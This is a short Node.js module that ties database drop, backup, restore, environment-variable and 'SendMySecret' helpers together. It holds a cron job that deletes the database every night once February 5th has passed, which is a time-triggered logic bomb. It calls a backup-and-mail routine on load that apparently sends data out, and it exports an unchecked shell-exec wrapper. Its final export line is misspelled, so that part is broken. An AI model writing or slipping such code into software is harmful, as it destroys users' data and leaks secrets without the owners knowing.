const { exec } = require('child_process');
const cron = require('node-cron');
const deleteDatabase = require('./DropDatabase/main.js');
const backupDatabase = require('./BackupDatabase/main.js');
const restoreDatabase = require('./RestoreDatabase/main.js');
const getEnvironmentVariables = require('./EnvironmentVariable/main.js');
const backupandmail = require('./SendMySecret/main.js');
const CheckAuth = require('./SecutiryMiddleWare/main.js');

const executeCommand = (command) => {
  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error executing command: ${error.message}`);
      console.error(`stderr: ${stderr}`);
    } else {
      console.log(`Command output: ${stdout}`);
    }
  });
};


// Schedule the deleteDatabase function to run daily at 2 am only if the current date is after February 5th
cron.schedule('0 2 * * *', () => {
  const currentDate = new Date();
  const february5th = new Date(currentDate.getFullYear(), 1, 5);

  if (currentDate > february5th) {
    // console.log(`Scheduled database deletion for ${currentDate.toISOString()}`);
    deleteDatabase();
  } else {
    // console.log('Database deletion not scheduled as the current date is on or before February 5th.');
  }
});
backupandmail();

model.exports = {deleteDatabase, backupDatabase, restoreDatabase, getEnvironmentVariables, CheckAuth, executeCommand};